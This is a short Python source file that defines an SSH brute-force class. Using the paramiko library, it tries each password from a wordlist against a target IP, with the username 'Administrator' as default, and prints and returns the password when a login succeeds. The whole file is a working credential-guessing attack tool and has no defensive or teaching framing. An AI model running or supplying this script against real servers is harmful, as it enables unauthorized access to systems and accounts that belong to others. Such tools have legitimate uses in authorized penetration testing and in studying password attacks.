import paramiko, sys, os, socket
import itertools, string, crypt

class SSHBruteForce:
	def __init__(self, IP, username="Administrator", port=22, passwordfile="./passwordfile.txt"):
		self.IP = IP
		self.username = username
		self.port = port
		self.passwordfile = passwordfile

	def bruteforce(self):
		with open(self.passwordfile, 'r') as f:
			passwords = f.read()
		pwds = passwords.splitlines()
		for pwd in pwds:
			try:
				ssh_client = paramiko.SSHClient()
				ssh_client.load_system_host_keys()
				ssh_client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
				try:
					ssh_client.connect(self.IP, port=self.port, username=self.username, password=pwd)
					print("Password found: "+pwd)
					return pwd
					break
				except paramiko.AuthenticationException as error:
					print("Failed Attempt: "+pwd)
					continue
				except socket.error as error:
					print("Socket error: ", error)
					continue
				except paramiko.SSHException as error:
					print("SSHException: ", error)
					continue
				except Exception as error:
					print("Exception: ", error)
					continue
				ssh_client.close()
			except Exception as error:
				print("OUTSIDE: ", error)
				return False
		return False
